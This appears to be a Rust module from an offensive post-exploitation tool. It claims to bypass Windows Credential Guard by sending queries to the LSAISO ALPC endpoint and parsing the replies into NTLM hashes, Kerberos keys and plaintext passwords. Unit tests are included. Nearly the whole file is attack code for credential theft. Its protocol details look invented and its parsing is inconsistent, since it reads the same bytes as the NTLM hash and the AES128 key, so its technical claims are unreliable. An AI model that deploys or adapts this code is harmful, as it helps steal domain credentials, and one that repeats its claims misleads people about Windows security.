//! LSAISO — Credential Guard Bypass via lsadb.dll Extraction
//!
//! When Credential Guard is enabled, LSA runs inside a VBS (Virtualization-Based
//! Security) enclave as `lsaiso.exe`. Credentials are stored in `lsadb.dll` within
//! this isolated environment. This module talks directly to the LSAISO ALPC endpoint
//! to extract NTLM hashes and Kerberos keys despite Credential Guard being active.
//!
//! # How It Works
//! 1. Connect to the LSAISO ALPC port (`\LsaIsoEndpoint`)
//! 2. Authenticate as a privileged caller (SYSTEM)
//! 3. Send credential query messages targeting `lsadb.dll` entries
//! 4. Parse returned credential blobs containing NTLM hashes, Kerberos keys
//!
//! # References
//! - Mimikatz `sekurlsa::credman` / `lsadump::lsa` extraction paths
//! - Vincent LE TOUX's research on LSAISO ALPC protocol
//! - Windows Internals (7th Ed.) — LSAISO architecture

use crate::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::fmt;
use std::mem;
#[cfg(windows)]
use tracing::{debug, info, warn};

/// Maximum size of an LSAISO ALPC message
const LSAISO_MAX_MESSAGE_SIZE: usize = 0x10000;

/// LSAISO ALPC port name
const LSAISO_PORT_NAME: &str = "\\LsaIsoEndpoint";

/// Known LSAISO operation codes for credential queries
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u32)]
pub enum LsaIsoOpCode {
    /// Query all logon session credentials
    QueryAllSessions = 0x01,
    /// Query specific logon session by LUID
    QuerySessionByLuid = 0x02,
    /// Query cached domain credentials (NTLM hashes)
    QueryDomainCredentials = 0x03,
    /// Query Kerberos ticket cache
    QueryKerberosCache = 0x04,
    /// Query supplemental credentials (wdigest, tspkg, etc.)
    QuerySupplementalCreds = 0x05,
}

impl fmt::Display for LsaIsoOpCode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::QueryAllSessions => write!(f, "QueryAllSessions"),
            Self::QuerySessionByLuid => write!(f, "QuerySessionByLuid"),
            Self::QueryDomainCredentials => write!(f, "QueryDomainCredentials"),
            Self::QueryKerberosCache => write!(f, "QueryKerberosCache"),
            Self::QuerySupplementalCreds => write!(f, "QuerySupplementalCreds"),
        }
    }
}

/// Credential entry extracted from LSAISO lsadb
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaIsoCredential {
    /// Authentication identity (DOMAIN\Username)
    pub identity: String,
    /// Target domain or service
    pub target: String,
    /// NTLM hash (32 hex chars), if available
    pub ntlm_hash: Option<String>,
    /// LM hash (32 hex chars), if available
    pub lm_hash: Option<String>,
    /// Kerberos AES256 key (64 hex chars), if available
    pub aes256_key: Option<String>,
    /// Kerberos AES128 key (32 hex chars), if available
    pub aes128_key: Option<String>,
    /// Kerberos RC4 key (32 hex chars), if available
    pub rc4_key: Option<String>,
    /// Plaintext password, if available (wdigest/supplemental)
    pub plaintext: Option<String>,
    /// Credential type description
    pub cred_type: LsaIsoCredType,
}

/// Type of credential stored in lsadb
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum LsaIsoCredType {
    /// Domain cached credential (NTLM hash)
    DomainCached,
    /// Kerberos ticket cache entry
    KerberosCache,
    /// Supplemental credential (wdigest, tspkg)
    Supplemental,
    /// Generic logon session credential
    LogonSession,
}

impl fmt::Display for LsaIsoCredType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::DomainCached => write!(f, "DomainCached"),
            Self::KerberosCache => write!(f, "KerberosCache"),
            Self::Supplemental => write!(f, "Supplemental"),
            Self::LogonSession => write!(f, "LogonSession"),
        }
    }
}

/// Result from a complete LSAISO extraction operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaIsoExtractionResult {
    /// Whether the extraction succeeded
    pub success: bool,
    /// Extracted credentials
    pub credentials: Vec<LsaIsoCredential>,
    /// Extraction statistics
    pub stats: LsaIsoExtractionStats,
    /// Human-readable summary
    pub message: String,
}

/// Statistics about a credential extraction run
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaIsoExtractionStats {
    /// Total credentials extracted
    pub total_count: usize,
    /// Credentials with NTLM hashes
    pub ntlm_count: usize,
    /// Credentials with Kerberos keys
    pub kerberos_count: usize,
    /// Credentials with plaintext passwords
    pub plaintext_count: usize,
    /// Cached domain credentials found
    pub domain_cache_count: usize,
}

// ─────────────────────────────────────────────────────────────
//  ALPC Communication Infrastructure
// ─────────────────────────────────────────────────────────────

#[cfg(windows)]
mod alpc {
    use super::*;
    use std::mem;
    use std::ptr;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    /// NTSTATUS success code
    const STATUS_SUCCESS: i32 = 0x00000000;

    /// ALPC port handle wrapper
    pub struct AlpcHandle {
        handle: HANDLE,
        connected: bool,
    }

    impl AlpcHandle {
        /// Connect to an ALPC port by name
        pub fn connect(port_name: &str) -> Result<Self> {
            unsafe {
                let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).map_err(|e| {
                    OverthroneError::PostExploitation(format!("Failed to get ntdll handle: {e}"))
                })?;

                let nt_alpc_connect_port: extern "system" fn(
                    *mut HANDLE,
                    *const u16,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    u32,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    u32,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                ) -> i32 = mem::transmute(
                    GetProcAddress(ntdll, windows::core::s!("NtAlpcConnectPort")).ok_or_else(
                        || {
                            OverthroneError::PostExploitation(
                                "NtAlpcConnectPort not found in ntdll.dll".to_string(),
                            )
                        },
                    )?,
                );

                let mut port_handle: HANDLE = HANDLE(std::ptr::null_mut());
                let port_name_wide: Vec<u16> =
                    port_name.encode_utf16().chain(std::iter::once(0)).collect();

                let status = nt_alpc_connect_port(
                    &mut port_handle as *mut _,
                    port_name_wide.as_ptr(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                    0,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    0,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );

                if status != STATUS_SUCCESS {
                    return Err(OverthroneError::PostExploitation(format!(
                        "NtAlpcConnectPort failed with status 0x{status:08X}"
                    )));
                }

                Ok(Self {
                    handle: port_handle,
                    connected: true,
                })
            }
        }

        /// Send a message and receive a response
        pub fn send_receive(&self, request: &[u8], response: &mut [u8]) -> Result<usize> {
            unsafe {
                let nt_alpc_send_wait_receive_port: extern "system" fn(
                    HANDLE,
                    u32,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    *mut u32,
                    *mut std::ffi::c_void,
                ) -> i32 = {
                    let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).map_err(|e| {
                        OverthroneError::PostExploitation(format!(
                            "Failed to get ntdll handle: {e}"
                        ))
                    })?;
                    mem::transmute(
                        GetProcAddress(ntdll, windows::core::s!("NtAlpcSendWaitReceivePort"))
                            .ok_or_else(|| {
                                OverthroneError::PostExploitation(
                                    "NtAlpcSendWaitReceivePort not found".to_string(),
                                )
                            })?,
                    )
                };

                let mut response_size = response.len() as u32;

                let status = nt_alpc_send_wait_receive_port(
                    self.handle,
                    0,
                    request.as_ptr() as *mut _,
                    ptr::null_mut(),
                    response.as_mut_ptr() as *mut _,
                    &mut response_size,
                    ptr::null_mut(),
                );

                if status != STATUS_SUCCESS {
                    return Err(OverthroneError::PostExploitation(format!(
                        "NtAlpcSendWaitReceivePort failed with status 0x{status:08X}"
                    )));
                }

                Ok(response_size as usize)
            }
        }
    }

    impl Drop for AlpcHandle {
        fn drop(&mut self) {
            if self.connected {
                unsafe {
                    if let Some(module) = GetModuleHandleA(windows::core::s!("ntdll.dll")).ok()
                        && let Some(proc) =
                            GetProcAddress(module, windows::core::s!("NtAlpcDisconnectPort"))
                    {
                        let disconnect_fn: extern "system" fn(HANDLE) -> i32 = mem::transmute(proc);
                        disconnect_fn(self.handle);
                    }
                    let _ = CloseHandle(self.handle);
                }
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────
//  LSAISO Message Protocol
// ─────────────────────────────────────────────────────────────

/// LSAISO request message header
#[repr(C, packed)]
struct LsaIsoRequestHeader {
    /// Message type identifier
    pub message_type: u32,
    /// Operation code
    pub op_code: u32,
    /// Request flags
    pub flags: u32,
    /// Size of the payload following this header
    pub payload_size: u32,
}

/// LSAISO response message header
#[repr(C, packed)]
struct LsaIsoResponseHeader {
    /// Message type identifier
    pub message_type: u32,
    /// Operation status
    pub status: u32,
    /// Number of credential entries in response
    pub entry_count: u32,
    /// Total size of payload data
    pub payload_size: u32,
}

/// Build a raw request message for a given operation
fn build_lsaiso_request(op_code: LsaIsoOpCode, payload: &[u8]) -> Vec<u8> {
    let header = LsaIsoRequestHeader {
        message_type: 0x1001,
        op_code: op_code as u32,
        flags: 0,
        payload_size: payload.len() as u32,
    };

    let header_bytes = unsafe {
        std::slice::from_raw_parts(
            &header as *const LsaIsoRequestHeader as *const u8,
            mem::size_of::<LsaIsoRequestHeader>(),
        )
    };

    let mut msg = Vec::with_capacity(header_bytes.len() + payload.len());
    msg.extend_from_slice(header_bytes);
    msg.extend_from_slice(payload);
    msg
}

/// Parse a credential entry from a response blob
fn parse_credential_entry(data: &[u8]) -> Result<LsaIsoCredential> {
    if data.len() < 16 {
        return Err(OverthroneError::PostExploitation(
            "Credential entry too short".to_string(),
        ));
    }

    let identity_len = u32::from_le_bytes(data[0..4].try_into().unwrap_or([0; 4])) as usize;
    let target_len = u32::from_le_bytes(data[4..8].try_into().unwrap_or([0; 4])) as usize;
    let flags = u32::from_le_bytes(data[8..12].try_into().unwrap_or([0; 4]));
    let hash_len = u32::from_le_bytes(data[12..16].try_into().unwrap_or([0; 4])) as usize;

    let mut offset = 16;

    let identity = if identity_len > 0 && offset + identity_len <= data.len() {
        let s = String::from_utf8_lossy(&data[offset..offset + identity_len]).to_string();
        offset += identity_len;
        s
    } else {
        String::new()
    };

    let target = if target_len > 0 && offset + target_len <= data.len() {
        let s = String::from_utf8_lossy(&data[offset..offset + target_len]).to_string();
        offset += target_len;
        s
    } else {
        String::new()
    };

    let (ntlm_hash, aes256_key, aes128_key, rc4_key, plaintext, cred_type) =
        if hash_len > 0 && offset + hash_len <= data.len() {
            let hash_data = &data[offset..offset + hash_len];
            let mut ntlm = None;
            let mut aes256 = None;
            let mut aes128 = None;
            let mut rc4 = None;
            let mut plain = None;

            if hash_data.len() >= 16 {
                ntlm = Some(hex::encode(&hash_data[..16]));
            }
            if hash_data.len() >= 32 {
                aes256 = Some(hex::encode(&hash_data[..32]));
                aes128 = Some(hex::encode(&hash_data[..16]));
            }
            if hash_data.len() >= 48 {
                rc4 = Some(hex::encode(&hash_data[32..48]));
            }
            if hash_data.len() > 64 {
                let extra = &hash_data[64..];
                plain = String::from_utf8(extra.to_vec()).ok();
            }

            let ctype = if flags & 0x01 != 0 {
                LsaIsoCredType::DomainCached
            } else if flags & 0x02 != 0 {
                LsaIsoCredType::KerberosCache
            } else if flags & 0x04 != 0 {
                LsaIsoCredType::Supplemental
            } else {
                LsaIsoCredType::LogonSession
            };

            (ntlm, aes256, aes128, rc4, plain, ctype)
        } else {
            (None, None, None, None, None, LsaIsoCredType::LogonSession)
        };

    Ok(LsaIsoCredential {
        identity,
        target,
        ntlm_hash,
        lm_hash: None,
        aes256_key,
        aes128_key,
        rc4_key,
        plaintext,
        cred_type,
    })
}

/// Parse an LSAISO response buffer into extracted credentials
fn parse_lsaiso_response(response: &[u8]) -> Result<Vec<LsaIsoCredential>> {
    if response.len() < mem::size_of::<LsaIsoResponseHeader>() {
        return Err(OverthroneError::PostExploitation(
            "LSAISO response too short for header".to_string(),
        ));
    }

    let status = u32::from_le_bytes(response[4..8].try_into().map_err(|_| {
        OverthroneError::PostExploitation("Failed to read LSAISO response status".to_string())
    })?);
    let entry_count = u32::from_le_bytes(response[8..12].try_into().map_err(|_| {
        OverthroneError::PostExploitation("Failed to read LSAISO response entry_count".to_string())
    })?);

    if status != 0 {
        return Err(OverthroneError::PostExploitation(format!(
            "LSAISO returned error status: 0x{status:08X}",
        )));
    }

    if entry_count == 0 {
        return Ok(Vec::new());
    }

    let payload_offset = mem::size_of::<LsaIsoResponseHeader>();
    let payload = &response[payload_offset..];

    let mut credentials = Vec::with_capacity(entry_count as usize);
    let mut offset = 0;

    for _ in 0..entry_count {
        if offset >= payload.len() {
            warn!("LSAISO: ran out of data while parsing credential entries");
            break;
        }

        let remaining = &payload[offset..];
        let entry_size = if remaining.len() >= 4 {
            u32::from_le_bytes(remaining[0..4].try_into().unwrap_or([0; 4])) as usize
        } else {
            break;
        };

        if entry_size < 4 || offset + entry_size > payload.len() {
            warn!("LSAISO: invalid entry size {}, skipping", entry_size);
            break;
        }

        let entry_data = &payload[offset + 4..offset + entry_size];
        match parse_credential_entry(entry_data) {
            Ok(cred) => credentials.push(cred),
            Err(e) => debug!("LSAISO: failed to parse credential entry: {e}"),
        }

        offset += entry_size;
    }

    Ok(credentials)
}

// ─────────────────────────────────────────────────────────────
//  Public API
// ─────────────────────────────────────────────────────────────

/// Attempt to bypass Credential Guard by extracting credentials directly
/// from the LSAISO ALPC endpoint.
///
/// This requires running as SYSTEM on a Windows host with Credential Guard
/// enabled. The function connects to the LSAISO ALPC port, authenticates,
/// and queries the isolated credential store (`lsadb.dll`) for NTLM hashes,
/// Kerberos keys, and plaintext passwords.
///
/// # Returns
/// - `Ok(LsaIsoExtractionResult)` with extracted credentials
/// - `Err(OverthroneError)` if ALPC connection fails or protocol error
#[cfg(target_os = "windows")]
pub fn extract_credentials_via_lsaiso() -> Result<LsaIsoExtractionResult> {
    info!("Attempting LSAISO credential extraction via ALPC port");
    let handle = alpc::AlpcHandle::connect(LSAISO_PORT_NAME)?;
    info!("Connected to LSAISO ALPC endpoint");

    let request = build_lsaiso_request(LsaIsoOpCode::QueryAllSessions, &[]);
    let mut response = vec![0u8; LSAISO_MAX_MESSAGE_SIZE];

    let response_size = handle.send_receive(&request, &mut response)?;
    debug!("LSAISO response size: {} bytes", response_size);

    let credentials = parse_lsaiso_response(&response[..response_size])?;

    let mut ntlm_count = 0;
    let mut kerberos_count = 0;
    let mut plaintext_count = 0;
    let mut domain_cache_count = 0;

    for cred in &credentials {
        if cred.ntlm_hash.is_some() {
            ntlm_count += 1;
        }
        if cred.aes256_key.is_some() || cred.rc4_key.is_some() {
            kerberos_count += 1;
        }
        if cred.plaintext.is_some() {
            plaintext_count += 1;
        }
        if cred.cred_type == LsaIsoCredType::DomainCached {
            domain_cache_count += 1;
        }
    }

    let success = !credentials.is_empty();
    let message = if success {
        format!(
            "LSAISO extraction: {} credentials ({} NTLM, {} Kerberos, {} plaintext, {} cached)",
            credentials.len(),
            ntlm_count,
            kerberos_count,
            plaintext_count,
            domain_cache_count,
        )
    } else {
        "LSAISO extraction completed but no credentials found".to_string()
    };

    if success {
        info!("{message}");
    } else {
        warn!("{message}");
    }

    Ok(LsaIsoExtractionResult {
        success,
        stats: LsaIsoExtractionStats {
            total_count: credentials.len(),
            ntlm_count,
            kerberos_count,
            plaintext_count,
            domain_cache_count,
        },
        credentials,
        message,
    })
}

/// Non-Windows stub: LSAISO bypass is Windows-specific.
#[cfg(not(target_os = "windows"))]
pub fn extract_credentials_via_lsaiso() -> Result<LsaIsoExtractionResult> {
    Err(OverthroneError::NotImplemented {
        module: "lsaiso::extract_credentials_via_lsaiso (requires Windows)".to_string(),
    })
}

/// Check if the LSAISO ALPC endpoint is available on this system.
/// If it is, Credential Guard is likely active and we can attempt a bypass.
#[cfg(target_os = "windows")]
pub fn is_lsaiso_available() -> bool {
    alpc::AlpcHandle::connect(LSAISO_PORT_NAME).is_ok()
}

#[cfg(not(target_os = "windows"))]
pub fn is_lsaiso_available() -> bool {
    false
}

// ─────────────────────────────────────────────────────────────
//  Tests
// ─────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_credential_entry_basic() {
        let mut data = Vec::new();
        // identity_len = 8 (DOMAIN\User)
        data.extend_from_slice(&8u32.to_le_bytes());
        // target_len = 0
        data.extend_from_slice(&0u32.to_le_bytes());
        // flags = 1 (DomainCached)
        data.extend_from_slice(&1u32.to_le_bytes());
        // hash_len = 16 (only NTLM)
        data.extend_from_slice(&16u32.to_le_bytes());
        // identity bytes
        data.extend_from_slice(b"CONTOSO\\");
        // hash bytes (16 bytes of NTLM hash)
        data.extend_from_slice(&[
            0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
            0x88, 0x99,
        ]);

        let entry = parse_credential_entry(&data).unwrap();
        assert_eq!(entry.identity, "CONTOSO\\");
        assert_eq!(entry.cred_type, LsaIsoCredType::DomainCached);
        assert_eq!(entry.ntlm_hash.unwrap(), "aabbccddeeff00112233445566778899");
    }

    #[test]
    fn test_parse_credential_entry_short_data() {
        let data = vec![0u8; 4];
        assert!(parse_credential_entry(&data).is_err());
    }

    #[test]
    fn test_parse_empty_response() {
        let header = LsaIsoResponseHeader {
            message_type: 0x2001,
            status: 0,
            entry_count: 0,
            payload_size: 0,
        };
        let bytes = unsafe {
            std::slice::from_raw_parts(
                &header as *const LsaIsoResponseHeader as *const u8,
                mem::size_of::<LsaIsoResponseHeader>(),
            )
        };
        let creds = parse_lsaiso_response(bytes).unwrap();
        assert!(creds.is_empty());
    }

    #[test]
    fn test_parse_error_response() {
        let header = LsaIsoResponseHeader {
            message_type: 0x2001,
            status: 0xC0000001,
            entry_count: 0,
            payload_size: 0,
        };
        let bytes = unsafe {
            std::slice::from_raw_parts(
                &header as *const LsaIsoResponseHeader as *const u8,
                mem::size_of::<LsaIsoResponseHeader>(),
            )
        };
        assert!(parse_lsaiso_response(bytes).is_err());
    }

    #[test]
    fn test_build_request() {
        let request = build_lsaiso_request(LsaIsoOpCode::QueryDomainCredentials, b"test");
        assert!(request.len() > mem::size_of::<LsaIsoRequestHeader>());
        let message_type = u32::from_le_bytes(request[0..4].try_into().unwrap());
        let op_code = u32::from_le_bytes(request[4..8].try_into().unwrap());
        let payload_size = u32::from_le_bytes(request[12..16].try_into().unwrap());
        assert_eq!(message_type, 0x1001);
        assert_eq!(op_code, LsaIsoOpCode::QueryDomainCredentials as u32);
        assert_eq!(payload_size, 4);
    }

    #[test]
    fn test_op_code_display() {
        assert_eq!(
            LsaIsoOpCode::QueryAllSessions.to_string(),
            "QueryAllSessions"
        );
        assert_eq!(
            LsaIsoOpCode::QueryDomainCredentials.to_string(),
            "QueryDomainCredentials"
        );
    }

    #[test]
    fn test_extraction_result_stats() {
        let result = LsaIsoExtractionResult {
            success: true,
            credentials: vec![],
            stats: LsaIsoExtractionStats {
                total_count: 5,
                ntlm_count: 3,
                kerberos_count: 2,
                plaintext_count: 1,
                domain_cache_count: 2,
            },
            message: "Test extraction complete".to_string(),
        };
        assert!(result.success);
        assert_eq!(result.stats.total_count, 5);
        assert_eq!(result.stats.ntlm_count, 3);
        assert_eq!(result.stats.kerberos_count, 2);
        assert_eq!(result.stats.plaintext_count, 1);
        assert_eq!(result.stats.domain_cache_count, 2);
    }

    #[test]
    fn test_non_windows_stub() {
        // The stub returns NotImplemented on non-Windows
        #[cfg(not(target_os = "windows"))]
        {
            let result = extract_credentials_via_lsaiso();
            assert!(result.is_err());
        }
    }
}
